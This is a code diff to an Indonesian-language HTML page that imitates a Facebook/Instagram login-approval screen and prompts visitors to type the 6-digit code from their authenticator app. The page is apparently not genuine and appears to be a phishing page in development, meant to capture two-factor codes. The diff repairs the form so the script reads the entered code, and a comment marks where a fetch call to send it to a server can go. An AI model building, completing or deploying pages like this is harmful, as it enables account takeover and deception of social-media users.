@@ -16,7 +16,6 @@
             color: #1c1e21;
         }
 
-        /* Header */
         header {
             width: 100%;
             background-color: #fff;
@@ -40,7 +39,6 @@
             letter-spacing: -1.5px;
         }
 
-        /* Container Card */
         .main-card {
             background: #fff;
             width: 90%;
@@ -64,7 +62,6 @@
             margin-bottom: 24px;
         }
 
-        /* Illustration Area */
         .illustration-box {
             width: 100%;
             background: linear-gradient(135deg, #fef1f5 0%, #eef6ff 100%);
@@ -74,13 +71,11 @@
             align-items: center;
             padding: 50px 0;
             margin-bottom: 24px;
-            position: relative;
         }
 
         .icon-stack {
             display: flex;
             align-items: center;
-            gap: -15px;
         }
 
         .icon-small { width: 50px; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1)); }
@@ -91,9 +86,9 @@
             border-radius: 20px; 
             box-shadow: 0 10px 20px rgba(0,0,0,0.1);
             z-index: 2;
+            margin: 0 -10px;
         }
 
-        /* Status Waiting */
         .status-row {
             display: flex;
             align-items: center;
@@ -116,23 +111,19 @@
         .status-text b { display: block; font-size: 16px; margin-bottom: 2px; }
         .status-text span { font-size: 14px; color: #606770; }
 
-        /* Alternative Method (Code Input) */
-        .alt-section {
-            margin-top: 24px;
-        }
-
+        .alt-section { margin-top: 24px; }
         .alt-section h3 { font-size: 16px; margin-bottom: 8px; }
         .alt-section p { font-size: 14px; color: #606770; margin-bottom: 16px; }
 
-        .input-group {
+        /* Form perbaikan */
+        .form-container {
             display: flex;
             gap: 10px;
-            flex-wrap: wrap;
+            width: 100%;
         }
 
-        input[type="text"] {
+        .input-field {
             flex: 1;
-            min-width: 150px;
             padding: 12px;
             border: 1px solid #dddfe2;
             border-radius: 6px;
@@ -140,7 +131,7 @@
             outline: none;
         }
 
-        input[type="text"]:focus { border-color: #1877f2; }
+        .input-field:focus { border-color: #1877f2; }
 
         .btn-submit {
             background-color: #1877f2;
@@ -150,21 +141,14 @@
             border-radius: 6px;
             font-weight: 600;
             cursor: pointer;
-            transition: background 0.2s;
         }
 
-        .btn-submit:hover { background-color: #166fe5; }
-
-        .footer-links {
-            margin-top: 20px;
-            font-size: 13px;
-        }
-
+        .footer-links { margin-top: 20px; font-size: 13px; }
         .footer-links a { color: #1877f2; text-decoration: none; font-weight: 500; }
-        .footer-links a:hover { text-decoration: underline; }
 
         @media (max-width: 500px) {
             .main-card { margin-top: 0; width: 100%; border-radius: 0; box-shadow: none; }
+            .form-container { flex-direction: column; }
         }
     </style>
 </head>
@@ -180,15 +164,15 @@
     <h1>Lihat notifikasi Anda</h1>
     
     <div class="description">
-        Kami mengirim notifikasi ke Aplikasi facebook atau akun Instagram Anda. 
+        Kami mengirim notifikasi ke Aplikasi Facebook atau akun Instagram Anda. 
         Buka perangkat tersebut untuk menyetujui login ini.
     </div>
 
     <div class="illustration-box">
         <div class="icon-stack">
-            <img src="https://img.icons8.com/color/144/facebook-new.png" class="icon-small" alt="FB" style="margin-right: -15px;">
+            <img src="https://img.icons8.com/color/144/facebook-new.png" class="icon-small" alt="FB">
             <img src="https://img.icons8.com/fluency/144/appointment-reminders.png" class="icon-main" alt="Bell">
-            <img src="https://img.icons8.com/color/144/instagram-new.png" class="icon-small" alt="IG" style="margin-left: -15px;">
+            <img src="https://img.icons8.com/color/144/instagram-new.png" class="icon-small" alt="IG">
         </div>
     </div>
 
@@ -204,13 +188,12 @@
         <h3>Gunakan kode keamanan</h3>
         <p>Jika Anda tidak menerima notifikasi, masukkan kode 6 digit dari aplikasi autentikator Anda.</p>
         
-        <div class="input-group">
-          <form id="Formulir">
-            <input type="OTP" class="input-field" id="OTP" placeholder="Security Code" required>
-            
-            <button class="btn-submit" type="submit">Confirm</button>
-</form>
-        </div>
+        <form id="Formulir" onsubmit="event.preventDefault(); verifyCode();">
+            <div class="form-container">
+                <input type="text" class="input-field" id="OTP" placeholder="Security Code" maxlength="6" required>
+                <button class="btn-submit" type="submit">Confirm</button>
+            </div>
+        </form>
 
         <div class="footer-links">
             <a href="#">Kirim ulang SMS</a> &nbsp;•&nbsp; 
@@ -221,12 +204,14 @@
 
 <script>
     function verifyCode() {
-        const code = document.getElementById('securityCode').value;
+        // Mengambil input berdasarkan ID "OTP" yang benar
+        const code = document.getElementById('OTP').value;
+        
         if(code.length < 6) {
             alert("Harap masukkan 6 digit kode keamanan.");
         } else {
             alert("Mencoba memverifikasi kode: " + code);
-            // Di sini Anda bisa menambahkan logika pengiriman data ke server
+            // Logika lanjutan (AJAX/Fetch) bisa ditaruh di sini
         }
     }
 </script>
